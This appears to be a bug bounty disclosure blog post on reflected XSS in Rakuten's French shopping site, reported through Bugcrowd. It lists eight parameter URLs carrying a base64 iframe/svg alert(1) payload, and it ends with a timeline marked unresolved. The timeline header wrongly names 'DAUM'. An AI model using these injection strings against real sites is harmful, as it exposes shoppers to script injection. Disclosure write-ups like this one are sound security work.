---
layout: post
date: 2021-10-01 00:00:12
title: "Reflected XSS in Rakuten VDP"
categories: Bug Bounty
tags: [Bug Bounty]
password: rxss
message: Encrypt
author:
  - Jeongwon Jo

---
## Summary

I found a 3 Reflected Cross site Scripting (XSS) on Rakuten VDP at dawn on October 1, 2021. And this was reported by Bug Crowd.

In addition, `Rakuten` is Japan's largest e-commerce company and a major IT company that operates various services including multiple communication services.

---

## Platform(s) Affected

```shell
- https://fr.shopping.rakuten.com/connect?url="><iframe%20src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk%2b"></iframe>
- https://fr.shopping.rakuten.com/connect?clubsubscription="><iframe%20src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk%2b"></iframe>
- (After Login) https://fr.shopping.rakuten.com/checkout?action=addressregister&address1="><iframe%20src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk%2b"></iframe>
- (After Login) https://fr.shopping.rakuten.com/checkout?action=addressregister&address2="><iframe%20src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk%2b"></iframe>
- (After Login) https://fr.shopping.rakuten.com/checkout?action=addressregister&zip="><iframe%20src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk%2b"></iframe>
- (After Login) https://fr.shopping.rakuten.com/checkout?action=addressregister&city="><iframe%20src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk%2b"></iframe>
- (After Login) https://fr.shopping.rakuten.com/checkout?action=addressregister&phone_1="><iframe%20src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk%2b"></iframe>
- (After Login) https://fr.shopping.rakuten.com/checkout?action=addressregister&phone_2="><iframe%20src="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk%2b"></iframe>
```

---
## PoC

<style>
    .myvideo {
        width: auto;
        max-width: 100%;
        height: auto;
    }
</style>
<video class="myvideo" controls preload>
    <source src="https://github.com/blogpocas/DATA/blob/main/BB/Rakuten%20VDP/Rakuten%20XSS.mov?raw=true" type="video/mp4">
</video>

---
## Reporting Timeline for DAUM

- 2021-10-01 04h 10m : Found a Reflected Cross-Site Scripting in Rakuten VDP.
- 2021-10-01 04h 25m : Reported this issue via the Bugcrowd.
- 2021-10-03 23h 18m : Changed the state to Triaged by Tal_Bugcrowd 
- 2021-10-04 11h 07m : Changed the state to Unresolved by Akitsugu_Ito 

---